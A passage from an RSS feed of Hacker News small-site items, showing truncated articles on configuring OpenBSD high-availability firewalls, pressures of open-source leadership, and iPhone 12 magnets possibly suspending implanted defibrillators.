working well, the power and flexibility it provides is second to none.</p><p><strong>Nathan Patel &amp; Juha Iso-Sipilä</strong></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.benevolent.com/engineering-blog/spark-on-kubernetes-for-nlp-at-scale</link>
            <guid isPermaLink="false">hacker-news-small-sites-25678165</guid>
            <pubDate>Thu, 07 Jan 2021 21:59:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenBSD: High-Availability Firewalling]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25678102">thread link</a>) | @rodrigo975
<br/>
January 7, 2021 | http://yetiops.net/posts/openbsd-firewall-ha/ | <a href="https://web.archive.org/web/*/http://yetiops.net/posts/openbsd-firewall-ha/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>While most posts on this site usually concern Linux, I have a bit of a soft spot for OpenBSD.</p>
<p>OpenBSD is an operating system from the Unix lineage, started in Bell Labs many years ago, eventually giving rise to the Berkley Software Distribution (BSD). The most known versions of BSD are NetBSD (who focus on portability, running on pretty much any hardware), FreeBSD (who focus on covering as many purposes as possible) and OpenBSD (who focus on security, sometimes at the expense of performance).</p>
<p>OpenBSD has (in my opinion) amazing documentation, and with a combination of their <code>man</code> pages and example configuration (eg <code>/etc/examples</code> is full of configuration examples), you can get most of the included daemons working.</p>
<p>OpenBSD also provides quite a comprehensive suite of software already bundled in, everything from routing daemons, web servers, firewalling, mail servers and much more.</p>
<p>In this post, I’m going to cover how you can setup a pair of OpenBSD machines to run as a highly-available firewall pair.</p>
<h2 id="diagram">Diagram</h2>
<p><img src="https://yetiops.net/img/openbsd-fw.png" alt="OpenBSD Firewalling"></p>
<p>In the diagram, we have a client machine (running on Debian 10), a server (<strong>net-01</strong>) and two OpenBSD virtual machines.</p>
<h2 id="installing-openbsd">Installing OpenBSD</h2>
<p>To set up OpenBSD, you will be presented with a text-based installer with a number of options to choose from. I won’t go into details here, as the OpenBSD <a href="https://www.openbsd.org/faq/faq4.html">FAQ</a> can cover every aspect of it. Summing up my chosen options though: -</p>
<ul>
<li>Three main networks
<ul>
<li>hvn2 - The link between the firewalls (running in the <code>169.254.0.0/31</code> range)</li>
<li>hvn3 - The link to the server (running in the <code>192.0.2.0/24</code> range)</li>
<li>hvn4 - The link to the client (running in the <code>192.168.99.0/24</code> range)</li>
</ul>
</li>
<li>Only installing a minimal file set, with no <strong>X11</strong> dependencies, or the text-based games file sets</li>
<li>Automatic partioning</li>
</ul>
<h2 id="setting-up-the-the-firewalls">Setting up the the firewalls</h2>
<p>To get the firewalls running, we need to setup the following daemons: -</p>
<ul>
<li><code>pf(4)</code> - PF, or Packet Filter, the OpenBSD packet filtering daemon</li>
<li><code>carp(4)</code> - CARP, or Common Address Redundancy Protocol, for highly available IPs (like VRRP or Cisco’s HSRP)</li>
</ul>
<p>We also need to do the following: -</p>
<ul>
<li>Add the correct IPs to each interface</li>
<li>Allow IP forwarding through the firewalls</li>
<li>Enable the <code>pfsync(4)</code> device, to sync state between the firewalls</li>
<li>Create the <code>carp(4)</code> interfaces</li>
<li>Define the <code>pf(4)</code> ruleset</li>
</ul>
<h3 id="setting-up-the-ip-interfaces">Setting up the IP interfaces</h3>
<p>To define an interface in OpenBSD, you create a file called <code>hostname.$INTERFACE-NAME</code>, replacing <strong>$INTERFACE-NAME</strong> with your interfaces (eg <strong>hvn2</strong>, <strong>vio1</strong>), in the <code>/etc</code> directory.</p>
<p>To demonstrate this, see below: -</p>
<div><pre><code data-lang="bash"><span>## hostname.hvn2</span>
inet 169.254.0.1 255.255.255.254

<span>## hostname.hvn3</span>
inet 192.0.2.10 255.255.255.0

<span>## hostname.hvn4</span>
inet 192.168.99.1 255.255.255.0
</code></pre></div><p>You can also supply the network mask in hexadecimal format (eg a <code>/24</code> would be <code>0xffffff00</code>). To enable the interfaces, you can use <code>doas sh /etc/netstart hvn2</code>.</p>
<p>You should now be able to see the interfaces: -</p>
<div><pre><code data-lang="bash">$ ifconfig hvn2
hvn2: flags<span>=</span>8a43&lt;UP,BROADCAST,RUNNING,ALLMULTI,SIMPLEX,MULTICAST&gt; mtu <span>1500</span>
        lladdr 00:15:5d:f4:91:ef
        index <span>3</span> priority <span>0</span> llprio <span>3</span>
        media: Ethernet manual
        status: active
        inet 169.254.0.1 netmask 0xfffffffe

$ ifconfig hvn3 
hvn3: flags<span>=</span>8b43&lt;UP,BROADCAST,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST&gt; mtu <span>1500</span>
        lladdr 00:15:5d:f4:91:f3
        index <span>4</span> priority <span>0</span> llprio <span>3</span>
        media: Ethernet manual
        status: active
        inet 192.0.2.10 netmask 0xffffff00 broadcast 192.0.2.255

$ ifconfig hvn4 
hvn4: flags<span>=</span>8b43&lt;UP,BROADCAST,RUNNING,PROMISC,ALLMULTI,SIMPLEX,MULTICAST&gt; mtu <span>1500</span>
        lladdr 00:15:5d:f4:91:f4
        index <span>5</span> priority <span>0</span> llprio <span>3</span>
        media: Ethernet manual
        status: active
        inet 192.168.99.1 netmask 0xffffff00 broadcast 192.168.99.255

</code></pre></div><p>You’ll need to ensure that each firewall has a different IP on it’s interfaces (i.e. using <code>192.168.99.2/24</code> on <strong>hvn4</strong> on the second firewall) so that they do not conflict.</p>
<h3 id="wait-what-is-doas">Wait, what is <code>doas</code>?</h3>
<p><code>doas(1)</code> is a privilege escalation utility, used to temporarily elevate a user’s privileges, to allow them to perform commands that they typically cannot as a normal user. For those familiar with <code>sudo</code>, it is very similar. The reason for its existence is a smaller codebase than <code>sudo</code> to maintain, and also the configuration syntax is quite simple.</p>
<p>This is a good example of OpenBSD choosing tools that they can maintain and audit easily, rather than using external tools (or maintaing their own fork). For other examples, see the choice of their own <code>httpd(8)</code> over NGINX, or <code>bgpd(4)</code> over Quagga/BIRD.</p>
<p>To get a simple version of <code>doas(1)</code> running, you can look at the <code>/etc/examples</code> directory for a sample <code>doas.conf</code> file. Copy this to <code>/etc/doas.conf</code>, and edit it to your tastes.</p>
<div><pre><code data-lang="bash"><span>## $OpenBSD: doas.conf,v 1.1 2016/09/03 11:58:32 pirofti Exp $</span>
<span>## Configuration sample file for doas(1).</span>
<span>## See doas.conf(5) for syntax and examples.</span>

<span>## Non-exhaustive list of variables needed to build release(8) and ports(7)</span>
<span>##permit nopass setenv { \</span>
<span>##    FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK \</span>
<span>##    DESTDIR DISTDIR FETCH_CMD FLAVOR GROUP MAKE MAKECONF \</span>
<span>##    MULTI_PACKAGES NOMAN OKAY_FILES OWNER PKG_DBDIR \</span>
<span>##    PKG_DESTDIR PKG_TMPDIR PORTSDIR RELEASEDIR SHARED_ONLY \</span>
<span>##    SUBPACKAGE WRKOBJDIR SUDO_PORT_V1 } :wsrc</span>

<span>## Allow wheel by default</span>
permit keepenv :wheel
</code></pre></div><p>The above does nothing more than allow the <strong>wheel</strong> group to use <code>doas(1)</code>. I add my user into the <strong>wheel</strong> group, and from then on I can use <code>doas(1)</code> to my hearts content.</p>
<h3 id="setting-up-pfsync4">Setting up <code>pfsync(4)</code></h3>
<p>For truly highly available firewalls, you need something that will synchronize the state between them. This is because if you just failover to another machine, the second machine would have no idea of what existing TCP connections are active, what UDP connections have been seen recently (eg VoIP calls) and how many hits each rule has seen (important for monitoring).</p>
<p>OpenBSD provides the <code>pfsync(4)</code> utility, which does exactly that. To quote the <code>man</code> page for <code>pfsync(4)</code></p>
<blockquote>
<p>If configured with a physical synchronisation interface, pfsync will also send state changes out on that interface, and insert state changes received on that interface from other systems into the state table.</p>
</blockquote>
<p>So if you have this running on an interface dedicated between two machines, they will share state information.</p>
<p>To make this work, you configure another <code>hostname.$INTERFACE-NAME</code> file, except this time it will be <code>hostname.pfsync</code>. The contents of the file will look something like the below: -</p>
<div><pre><code data-lang="bash">$ cat /etc/hostname.pfsync0                                                                                         
up syncdev hvn2
</code></pre></div><p>This is the same on both firewalls. If you run <code>tcpdump(8)</code> on <strong>hvn2</strong> while the firewall is in operation, you will see numerous state messages passing between the two firewalls (try running <code>tcpdump -i hvn2</code> during operation to see).</p>
<h3 id="allow-ip-forwarding">Allow IP Forwarding</h3>
<p>IP Forwarding is configured within the <code>/etc/sysctl.conf</code> file as such: -</p>
<div><pre><code data-lang="bash">$ cat /etc/sysctl.conf
net.inet.ip.forwarding<span>=</span><span>1</span>
</code></pre></div><p>Without this, traffic will not work through the firewalls, so make sure you enable this!</p>
<h3 id="add-carp4-for-redundancy">Add <code>carp(4)</code> for redundancy</h3>
<p>Unless you use devices that support routing protocols, or can failover between multiple default gateways, you’ll need to target an IP that can reside on both firewalls. In the Cisco world, they use <strong>HSRP</strong> (Hot Standby Router Protocol). The RFC version of <strong>HSRP</strong> is known as <strong>VRRP</strong> (Virtual Router Redundancy Protocol). However, despite <strong>VRRP</strong> being an RFC standard, it is patent-encumbered, meaning some elements of it are covered by patents (owned by Cisco).</p>
<p>Due to this, the OpenBSD developers implemented <strong>CARP</strong> instead. <strong>CARP</strong> does not infringe on any Cisco patents, although it does still use a few traits of VRRP (eg the IP Protocol number and Virtual MAC Addresses). This does mean that if you have <strong>VRRP</strong> and <strong>CARP</strong> on the same network, you will need to use different VRRP Group IDs and CARP Virtual Host IDs for them to coexist.</p>
<p>Again, to setup a <code>carp(4)</code> interface on the primary firewall, you use the <code>hostname.$INTERFACE-NAME</code> files. To demonstrate, see below: -</p>
<div><pre><code data-lang="bash"><span>## hostname.carp1</span>
inet 192.0.2.1 255.255.255.0 192.0.2.255 vhid <span>1</span> carpdev hvn3 pass hvn3pass

<span>## hostname carp2</span>
inet 192.168.99.254 255.255.255.0 192.168.99.255 vhid <span>1</span> carpdev hvn4 pass hvn4pass 
</code></pre></div><p>The syntax is as follows: -</p>
<p><code>inet $VIRTUAL-IP $SUBNET-MASK $BROADCAST-ADDRESS vhid $CARP-VIRTUAL-HOST-ID carpdev $PHYSICAL-INTERFACE pass $PASSWORD</code></p>
<p>You need to ensure the Virtual IP is in the same network as the interface it is running on. The Physical Interface parameter is used to tie the <strong>CARP</strong> virtual interface to a physical interface.</p>
<p>Again, use <code>doas /etc/netstart carpN</code> to start the interfaces: -</p>
<div><pre><code data-lang="bash">$ ifconfig carp1
carp1: flags<span>=</span>8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu <span>1500</span>
        lladdr 00:00:5e:00:01:01
        index <span>8</span> priority <span>15</span> llprio <span>3</span>
        carp: MASTER carpdev hvn3 vhid <span>1</span> advbase <span>1</span> advskew <span>0</span>
        groups: carp
        status: master
        inet 192.0.2.1 netmask 0xffffff00 broadcast 192.0.2.255

$ ifconfig carp2
carp2: flags<span>=</span>8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu <span>1500</span>
        lladdr 00:00:5e:00:01:01
        index <span>9</span> priority <span>15</span> llprio <span>3</span>
        carp: MASTER carpdev hvn4 vhid <span>1</span> advbase <span>1</span> advskew <span>0</span>
        groups: carp
        status: master
        inet 192.168.99.254 netmask 0xffffff00 broadcast 192.168.99.255
</code></pre></div><p>Notice in the above that it shows the status of the interface (in this case, the <strong>MASTER</strong>).</p>
<p>The syntax for the <code>hostname</code> files on the secondary firewall differs slightly: -</p>
<div><pre><code data-lang="bash"><span>## hostname.carp1</span>
inet 192.0.2.1 255.255.255.0 192.0.2.255 vhid <span>1</span> carpdev hvn3 pass hvn3pass advskew <span>128</span>

<span>## hostname.carp2</span>
inet 192.168.99.254 255.255.255.0 192.168.99.255 vhid <span>1</span> carpdev hvn4 pass hvn4pass advskew <span>128</span>
</code></pre></div><p>The primary difference is the <code>advskew</code> parameter. This is used to set a “priority” or “weight” on the interface, higher being less preferred.</p>
<p>The interface output on the secondary firewall looks like this: -</p>
<div><pre><code data-lang="bash">$ ifconfig carp1
carp1: flags<span>=</span>8843&lt;UP,BROADCAST,RUNNING,SIMPLEX,MULTICAST&gt; mtu <span>1500</span>
        lladdr 00:00:5e:00:01:01
        index <span>8</span> priority <span>15</span> llprio <span>3</span>
        carp: BACKUP carpdev …</code></pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://yetiops.net/posts/openbsd-firewall-ha/">http://yetiops.net/posts/openbsd-firewall-ha/</a></em></p>]]>
            </description>
            <link>http://yetiops.net/posts/openbsd-firewall-ha/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25678102</guid>
            <pubDate>Thu, 07 Jan 2021 21:54:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Five Pressures of Leadership in OSS]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25677766">thread link</a>) | @alexellisuk
<br/>
January 7, 2021 | https://blog.alexellis.io/the-5-pressures-of-leadership/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/the-5-pressures-of-leadership/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>In this post I want to introduce the reader to five pressures that I have encountered over the past five years of building, leading, and maintaining Open Source Software (OSS) with community. This essay is primarily about being a leader in Open Source, but I believe <a href="https://www.amazon.co.uk/How-Survive-Thrive-Church-Leader/dp/1854247611">it applies outside of technology</a> too.</p>
<blockquote>
<p>My aim is to foster understanding and empathy between contributors, community members, users, and maintainers. I would also like for maintainers and leaders in Open Source to feel a sense of solidarity in their shared burden.</p>
</blockquote>
<p>It is often said that Open Source Software is not sustainable, because it has no inherent business model, but I believe there are other pressures that leaders experience which when left unchecked may lead to "burn-out".</p>
<p>I'll briefly describe what I believe leadership means before introducing each of the pressures and how they may be experienced. It's my opinion that the examples apply beyond Open Source Software and the technology industry. I will then sum up the pressures and make a case for sustainable leadership.</p>
<p>As a disclaimer, I've generalised my experience and what I've shared here. I am not referring to any one person, even if you can identify with what I'm saying.</p>
<h2 id="whatisleadership">What is leadership?</h2>
<p>The Oxford English Dictionary defines leadership as a noun:</p>
<ul>
<li>
<p>the action of leading a group of people or an organization.</p>
<p>Synonymns: guidance, direction, authority, control, management, superintendence, supervision; organization, government, orchestration, initiative, influence</p>
</li>
<li>
<p>the state or position of being a leader.</p>
<p>Synonymns: headship, directorship, direction, governorship, governance, administration, jurisdiction, captaincy, superintendency, control, ascendancy, rule, command, power, mastery, domination, dominion, premiership, sovereignty</p>
</li>
</ul>
<p>It is clear from the sheer amount of synonymns for the term, that the word itself can have many meanings and nauances. I would also suggest that the our own experiences and culture may project specific expectations and connotations.</p>
<p>For some Open Source maintainers, leadership may start unintentionally. A developer may become inspired to build an idea into a project and by default is the director and administrator. All of the control rests with them and at this stage the project is likely to be classed as be a Proof of Concept (PoC), an experiment or a "side-project." Other people are unlikely to be involved, but that may change quickly. The maintainer is the de factor leader in their team of one.</p>
<p>Some projects remain in this state, but others may draw in users and contributors who in turn volunteer their time, ideas, and energy to advance the project. The maintainer must now set a direction, communicate it, and begin to decide how to govern the project. For me mirroring the style of other maintainers and leaders I knew helped significantly. In my experience these skills can be learned "on the job", but it's easy to get things wrong.</p>
<p>In most companies there are two tracks for a career - either as an individual contributor or as a people-manager. Individual Contributors tend to be builders of things and have very technical work. They may also lead a team or hold responsibility depending on their level of seniority. <a href="https://www.amazon.co.uk/Managing-Humans-Humorous-Software-Engineering/dp/1430243147">People managers have a very different set of skills</a> and deliver results for the business through delegation and by constantly communicating across teams.</p>
<p>In a corporation you are likely to have a very clearly defined role and hierarchy to fall into, but as an Open Source leader and maintainer your work will be a mixture of the two tracks.</p>
<p>This is an apt time to introduce the first pressure: unclear boundaries.</p>
<h2 id="1unclearboundaries">1. Unclear boundaries</h2>
<p>What is your role? What does it say on LinkedIn, and on your business cards? Does that differ from what you actually do on a day to day basis? Do you work 1 in 3 weekends? Are you on rotation for on-call duties? Do you have reports?</p>
<p>As a leader of a community and an Open Source project, there is no job description and there are no set hours. One of the synomymns for leadership is governance, and that can cover how you and the project operate. I started to define a model for governance with a "Contributing Guide" which explains the process for raising an issue or requesting a change.</p>
<p>People who come to the project now look to me and the other primary contributors to operate within that governance model and for that reason it is important to do so. Some may not be aware of the processes and some even chose to ignore them. I believe that leaders need to be flexible, but if they say one thing and to do another continually, then it sets a confusing example for others to follow.</p>
<p>When I began I enjoyed the interest in my projects from users and contributors from all around the world. People would contact me at all hours of the day and night and I wanted to reply to every notification and email within minutes, if I could. I quickly found that I wouldn't be able to keep that up.</p>
<p>Having no clear hours means that unless you are careful, that you are actually on-call 27/4, 365 days, even when you're on vacation.</p>
<p>If left unchecked then unclear boundaries can lead to an intermingling of the leader's self with the project and team. I believe that this is understandable given the investment and stake the leader has, but gaining validation and self-worth through the success or failure, growth rate or decline of something outside of their control is a recipe for burning out.</p>
<p>Rather than being able to celebrate past achivements, the leader may start to feel pressure to grow the project to compete with similar product offerings. Those products may be built by companies with well-staffed teams and 7-figure budget, so it is not unly unatainable, but unfair.</p>
<p>The pressure of unclear boundaries means that users and other contributors may bring unreasonable expectations to your door and you may feel obliged to do what is asked of you.</p>
<h2 id="2pay">2. Pay</h2>
<p>Whilst the curve for leadership positions within a corporation inflects up steeply, this is simply a different matter in Open Source and those involved in other types of public service.</p>
<p>In my opinion there is no clear business model for Open Source Software, which means there is also no reason for someone to pay me for maintaining or building that software. A friend recently explained this to me in terms of "value capture", which I found immensely useful.</p>
<p>OSS allows companies and other OSS projects to stand on the tall shoulders of those that came before, and to either enhance or to put a new spin on prior work. That means capturing and amplifying existing value for something new.</p>
<p>In the same way that I cannot and will not be able to afford to pay the Golang development team for their many years of efforts that I leverage in my work. It seems equally unlikely that an end-user company will be able to pay me for the value I have created for them, that they capture and amplified in their business.</p>
<blockquote>
<p>It is liberating to remove the unrealistic and unreasonable expectation that end-user companies should pay us for our work.</p>
</blockquote>
<p>Given that maintaining and building features for OSS can take a significant amount of time, this leaves maintainers with only a few options. Such as the following:</p>
<ul>
<li>Work full-time for a company, and overtime for the OSS project in your evenings and weekends</li>
<li>Work part-time consulting through your own company, and part-time without pay for your OSS project</li>
<li>Find a co-founder, seek out investment, and build a commercial product from the project</li>
<li>Don't earn a salary at all, and work for full-time without pay on the OSS project</li>
<li>Close the OSS project, or pass the mantle on to someone else</li>
</ul>
<p>There are some exceptions where developers are recruited and paid to work on Open Source projects for a variety of reasons. This is much different than a maintainer being hired specifically to maintain and build the project they lead.</p>
<p>You will also note that I did not include <a href="https://github.com/users/alexellis/sponsorship">"sponsorship" as an option</a>, this is because in my experience sponsorship is a hard sell and difficult to do meaningfully. I currently view sponsorship as a top-up mechanism to part-time consulting, rather than as a means to an end.</p>
<p>Whichever option a maintainer picks, there will always be a significant amount of money left on the table. This is a pressure that can build over time, especially when compared to peers working for a company.</p>
<h2 id="3workingwithvolunteers">3. Working with volunteers</h2>
<p>Has anyone ever asked you to do them a favour?</p>
<p>It may be something as simple as getting a latte for a colleague on your coffee run, helping your neighbour move house, giving your wife a lift to work because her car is in at the mechanic's, reaching into your pocket to give change to someone on the street, going bowling for a work outing, or even setting up a new printer for a relative.</p>
<p>How did you feel about the ask? "It depends" you say. It depends on the relationship, how much it inconveniences you, and what you may get back in return. I know that if it's my turn to buy dinner, next time I meet my friend, he will be paying.</p>
<p>With the example of taking my wife to work, it's highly unlikely that I'd flake. I can't think of anything I'd rather do less than setting up a relative's printer and I would easily change my mind about the work bowling trip.</p>
<p>I believe that when leading an Open Source project or a community, that volunteers are essential to its success. As a maintainer, your pay is already below par and funding is unlikely to be bountiful. So relying on goodwill, favours, and external contributions become ever more important as the project grows. Not to mention that to grow and extend the impact of your project, you will need to delegate responsibility and duties to other people.</p>
<p>Other leaders will be quick to tell you to "just delegate". In my experience delegation is key to growing a community and for motivating others to act not only in their own interest, but for the common good.</p>
<p>If a maintainer starts a project on their own, then it may be hard …</p></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.alexellis.io/the-5-pressures-of-leadership/">https://blog.alexellis.io/the-5-pressures-of-leadership/</a></em></p>]]>
            </description>
            <link>https://blog.alexellis.io/the-5-pressures-of-leadership/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25677766</guid>
            <pubDate>Thu, 07 Jan 2021 21:28:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[iPhone 12 magnets deactivating implanted defibrillators in cardiac patients]]>
            </title>
            <description>
<![CDATA[
Score 34 | Comments 12 (<a href="https://news.ycombinator.com/item?id=25677717">thread link</a>) | @efunkem
<br/>
January 7, 2021 | http://www.medmalreviewer.com/does-the-iphone-12-deactivate-implantable-cardioverter-defibrillators/ | <a href="https://web.archive.org/web/*/http://www.medmalreviewer.com/does-the-iphone-12-deactivate-implantable-cardioverter-defibrillators/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<div data-elementor-type="wp-post" data-elementor-id="3642" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="d29a4f4" data-element_type="section">
						<div>
							<div>
					
				<div data-id="d4df9de" data-element_type="column">
			<div>
							<div>
						<div data-id="82f4b7d" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>An interesting article came out <a href="https://www.heartrhythmjournal.com/article/S1547-5271(20)31227-3/fulltext?fbclid=IwAR3DokV5V8f8G-LYlKwXFDjdIE5Jf9w4B5KAgpv0vRJ8P2--ZvOfyQO802k">a few days ago in Heart Rhythm</a>, raising concern that new hardware in the iPhone 12 may deactivate implanted cardioverter defibrillators (ICDs).&nbsp;</p>
<p>In short, the concern is that an array of magnets in the phone may turn off the life-saving function of these cardiac devices.</p>
<p>This “MagSafe” technology was already used elsewhere, but this is the first time it has been incorporated into an iPhone.</p>
<p>Nearly all ICDs will stop shocking a patient when placed near a sufficiently strong magnet.&nbsp;</p>
<p>Pacemakers exposed to a magnet are set to a pre-programmed mode that varies by manufacturer, usually with a rate of 65-80bpm.&nbsp;</p>
<p>Ask any Emergency Medicine physician and they will be able to point you to a blue circular magnet used for this exact purpose.&nbsp;</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="50b654d" data-element_type="section">
						<div>
							<div>
					
				<div data-id="7506540" data-element_type="column">
			<div>
							<div>
						<div data-id="074d5bd" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="800" height="812" src="http://www.medmalreviewer.com/wp-content/uploads/2021/01/Magnet.jpg" alt="" loading="lazy" srcset="http://www.medmalreviewer.com/wp-content/uploads/2021/01/Magnet.jpg 819w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Magnet-296x300.jpg 296w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Magnet-768x779.jpg 768w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Magnet-500x507.jpg 500w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Magnet-800x812.jpg 800w" sizes="(max-width: 800px) 100vw, 800px">											</p>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="a778930" data-element_type="section">
						<div>
							<div>
					
				<div data-id="c5b38f5" data-element_type="column">
			<div>
							<div>
						<div data-id="7ba4163" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>A patient with a malfunctioning pacemaker or defibrillator may be suffering numerous inappropriate shocks. The magnet comes in very handy in these situations.</p>
<p>However, a patient that goes into ventricular tachycardia (among other life-threatening cardiac rhythms) will need their device to work appropriately, delivering a shock to save their life.</p>
<p>If this issue is reproduceable in other patients, an iPhone 12 carried in a front shirt pocket has the chance to inactivate the device and block life-saving electrical therapy.&nbsp;</p>
<p>The authors demonstrated this (<a href="https://www.heartrhythmjournal.com/article/S1547-5271(20)31227-3/fulltext?fbclid=IwAR3DokV5V8f8G-LYlKwXFDjdIE5Jf9w4B5KAgpv0vRJ8P2--ZvOfyQO802k">picture from their publication</a>) using an iPhone 12 on a real patient with an ICD:</p>
</div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="c205503" data-element_type="section">
						<div>
							<div>
					
				<div data-id="253ec3d" data-element_type="column">
			<div>
							<div>
						<div data-id="e92e1ac" data-element_type="widget" data-widget_type="image.default">
				<div>
					<div>
							<figure>
										<img width="499" height="556" src="http://www.medmalreviewer.com/wp-content/uploads/2021/01/gr1_lrg-1.jpg" alt="" loading="lazy" srcset="http://www.medmalreviewer.com/wp-content/uploads/2021/01/gr1_lrg-1.jpg 499w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/gr1_lrg-1-269x300.jpg 269w" sizes="(max-width: 499px) 100vw, 499px">											<figcaption></figcaption>
										</figure>
					</div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="6a3c0ef" data-element_type="section">
						<div>
							<div>
					
				<div data-id="9263bf4" data-element_type="column">
			<div>
							<div>
						<div data-id="e311c1c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Green arrow: iPhone 12 placed over ICD<br>Red arrow: Interrogation device – “SUSPENDED: Magnet Present”<br>Yellow arrow: Magnetic ring in iPhone 12</p>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="5370fb2" data-element_type="section">
						
		</section>
				<section data-id="2bfc3bb" data-element_type="section">
						
		</section>
				<section data-id="7669176" data-element_type="section">
						<div>
							<div>
					
				<div data-id="58dae32" data-element_type="column">
			<div>
							<div>
						<div data-id="c785851" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="800" height="666" src="http://www.medmalreviewer.com/wp-content/uploads/2021/01/Breakdown-Phone.jpg" alt="" loading="lazy" srcset="http://www.medmalreviewer.com/wp-content/uploads/2021/01/Breakdown-Phone.jpg 829w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Breakdown-Phone-300x250.jpg 300w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Breakdown-Phone-768x639.jpg 768w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Breakdown-Phone-500x416.jpg 500w, http://www.medmalreviewer.com/wp-content/uploads/2021/01/Breakdown-Phone-800x666.jpg 800w" sizes="(max-width: 800px) 100vw, 800px">											</p>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="a783810" data-element_type="section">
						<div>
							<div>
					
				<div data-id="5a8a0ce" data-element_type="column">
			<div>
							<div>
						<div data-id="f5d8fdd" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Notice the similar circular layout between the iPhone and the standard blue medical magnet.</p>
<p>Physicians should be aware of this issue. While there is no active litigation related to this, it is a very high risk situation.&nbsp;<span>&nbsp;</span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="fa63cd5" data-element_type="section">
						
		</section>
				<section data-id="a87a621" data-element_type="section">
						<div>
							<div>
					
				<div data-id="2b0d0b5" data-element_type="column">
			<div>
							<div>
						<div data-id="bff2ed2" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>MedMalReviewer Opinion:</p>
<p>1. This is unlikely to result in medical malpractice litigation against any individual physician. However, it does place the manufacturer at risk for product liability.&nbsp;</p>
<p>2. ED physicians should keep this in mind for patients with out-of-hospital cardiac arrest. These patients should be completely exposed during the code, removing all clothing and foreign objects.&nbsp;</p>
<p>3. For patients with pacemakers, consider that any unusual or unexplained symptoms could have been explained by a transient switch in pacemaker mode while their phone was nearby. Interrogating the pacemaker will help shed light on this.</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="3d300b0" data-element_type="section">
						
		</section>
				<section data-id="508993e" data-element_type="section">
						<div>
							<div>
					
				<div data-id="86adb72" data-element_type="column">
			<div>
							<div>
						<div data-id="63012ba" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Check out these real-life medical malpractice cases:</p>
<p><a href="http://www.medmalreviewer.com/case-13-cervical-fusion/">Case 13: Cervical Fusion</a> – A patient suffers an unexpected cardiac arrest during a neck surgery.&nbsp;</p>
<p><a href="http://www.medmalreviewer.com/case-15-ski-accident/">Case 15: Ski Accident</a> – A patient on blood thinners crashes and hits her head while skiing.</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="207a1e5" data-element_type="section">
						
		</section>
				<section data-id="c177169" data-element_type="section">
						<div>
							<div>
					
				<div data-id="e09ce0e" data-element_type="column">
			<div>
							<div>
						<div data-id="5227a13" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Read expert witness opinions from malpractice lawsuits:</p>
<p><a href="https://expertwitness.substack.com/p/expert-witness-case-34">Expert Witness Case #34</a>&nbsp;– Urologist accidentally ligates artery instead of vas deferens during vasectomy. Patient loses testicle.</p>
<p><a href="https://expertwitness.substack.com/p/expert-witness-case-32">Expert Witness Case #32</a>&nbsp;– Patient admitted with DKA develops severe leg pain. Long delays in care result in amputation.</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
				
								</div>
					</div>
		</section>
				<section data-id="5586f05" data-element_type="section">
						
		</section>
						</div>
						</div>
					</div>
				
			</div></div>]]>
            </description>
            <link>http://www.medmalreviewer.com/does-the-iphone-12-deactivate-implantable-cardioverter-defibrillators/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25677717</guid>
            <pubDate>Thu, 07 Jan 2021 21:24:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What React Gets Wrong]]>
            </title>
            <description>
<![CDATA[
